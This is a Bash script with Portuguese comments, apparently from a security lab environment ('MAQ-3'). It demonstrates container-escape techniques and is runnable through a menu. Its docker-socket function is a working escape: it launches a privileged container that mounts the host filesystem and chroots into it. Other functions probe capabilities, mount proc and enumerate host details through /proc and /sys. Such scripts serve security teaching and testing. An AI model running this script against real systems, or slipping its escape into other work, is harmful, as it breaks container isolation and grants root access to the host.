#!/bin/bash

# Container Escape Demo - MAQ-3
# Este script demonstra técnicas de escape de container

set -e

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_header() {
    echo -e "${BLUE}"
    echo "=========================================="
    echo "  CONTAINER ESCAPE DEMO - MAQ-3"
    echo "=========================================="
    echo -e "${NC}"
}

print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

# Verificar se estamos dentro do container
check_container() {
    if [ -f /.dockerenv ]; then
        print_status "Executando dentro do container MAQ-3"
        return 0
    else
        print_error "Este script deve ser executado DENTRO do container"
        print_status "Use: docker exec -it maquina3-soc bash"
        exit 1
    fi
}

# Técnica 1: Docker Socket Escape
docker_socket_escape() {
    print_header
    print_status "Técnica 1: Escape via Docker Socket"
    echo
    
    if [ -S /var/run/docker.sock ]; then
        print_success "Docker socket encontrado em /var/run/docker.sock"
        
        # Verificar se docker CLI está disponível
        if command -v docker &> /dev/null; then
            print_status "Docker CLI disponível, tentando escape..."
            
            # Listar containers do host
            print_warning "Listando containers do host:"
            docker ps
            
            # Tentar criar container com acesso ao host
            print_warning "Criando container com acesso ao host..."
            docker run --rm -it --privileged -v /:/host ubuntu:latest chroot /host bash -c "
                echo 'ESCAPE BEM-SUCEDIDO!'
                echo 'Agora estamos no host com privilégios elevados'
                echo 'Hostname: ' \$(hostname)
                echo 'Usuário: ' \$(whoami)
                echo 'Processos: ' \$(ps aux | head -5)
            "
            
        else
            print_error "Docker CLI não disponível"
        fi
    else
        print_error "Docker socket não encontrado"
    fi
}

# Técnica 2: Capabilities Exploitation
capabilities_escape() {
    print_header
    print_status "Técnica 2: Exploiting Linux Capabilities"
    echo
    
    # Verificar capabilities
    print_status "Capabilities atuais:"
    cat /proc/self/status | grep Cap
    
    # SYS_ADMIN - Montar filesystems
    print_warning "Tentando montar /proc do host..."
    mkdir -p /tmp/host_proc 2>/dev/null || true
    mount -t proc none /tmp/host_proc 2>/dev/null && {
        print_success "Montagem de /proc bem-sucedida!"
        ls -la /tmp/host_proc/ | head -10
    } || print_error "Falha na montagem de /proc"
    
    # NET_ADMIN - Manipular rede
    print_warning "Tentando manipular interfaces de rede..."
    ip link show 2>/dev/null && {
        print_success "Acesso às interfaces de rede confirmado!"
        ip addr show
    } || print_error "Sem acesso às interfaces de rede"
}

# Técnica 3: Privileged Container Exploitation
privileged_escape() {
    print_header
    print_status "Técnica 3: Exploiting Privileged Container"
    echo
    
    # Verificar se estamos em modo privilegiado
    if [ -w /dev/mem ]; then
        print_success "Container em modo privilegiado detectado!"
        print_warning "Acesso direto à memória do host disponível"
    fi
    
    # Acessar informações do host
    print_status "Informações do host via /proc:"
    echo "Hostname: $(cat /proc/sys/kernel/hostname 2>/dev/null || echo 'N/A')"
    echo "Kernel: $(cat /proc/version 2>/dev/null || echo 'N/A')"
    
    # Verificar montagens
    print_status "Montagens do host:"
    cat /proc/mounts | grep -E "(proc|sys|dev)" | head -5
    
    # Verificar processos do host
    print_status "Processos do host (primeiros 5):"
    ps aux | head -6
}

# Técnica 4: Proc/Sys Mount Escape
proc_sys_escape() {
    print_header
    print_status "Técnica 4: Escape via /proc e /sys"
    echo
    
    # Verificar se /proc e /sys estão montados
    if mountpoint -q /proc; then
        print_success "/proc está montado"
        
        # Acessar informações do host
        print_warning "Acessando informações do host via /proc:"
        echo "Processos do host:"
        ls /proc/ | grep -E "^[0-9]+$" | head -5
        
        echo "Interfaces de rede do host:"
        ls /proc/net/ | head -5
        
    else
        print_error "/proc não está montado"
    fi
    
    if mountpoint -q /sys; then
        print_success "/sys está montado"
        
        # Acessar informações do sistema
        print_warning "Informações do sistema via /sys:"
        echo "Interfaces de rede:"
        ls /sys/class/net/ 2>/dev/null | head -5
        
        echo "Dispositivos de bloco:"
        ls /sys/class/block/ 2>/dev/null | head -5
        
    else
        print_error "/sys não está montado"
    fi
}

# Menu principal
main() {
    case "${1:-all}" in
        "docker")
            docker_socket_escape
            ;;
        "capabilities")
            capabilities_escape
            ;;
        "privileged")
            privileged_escape
            ;;
        "proc-sys")
            proc_sys_escape
            ;;
        "all")
            docker_socket_escape
            echo
            capabilities_escape
            echo
            privileged_escape
            echo
            proc_sys_escape
            ;;
        *)
            echo "Uso: $0 [docker|capabilities|privileged|proc-sys|all]"
            echo
            echo "Técnicas disponíveis:"
            echo "  docker      - Escape via Docker socket"
            echo "  capabilities - Exploiting Linux capabilities"
            echo "  privileged  - Exploiting privileged container"
            echo "  proc-sys    - Escape via /proc e /sys"
            echo "  all         - Executar todas as técnicas"
            exit 1
            ;;
    esac
}

# Executar
main "$@"
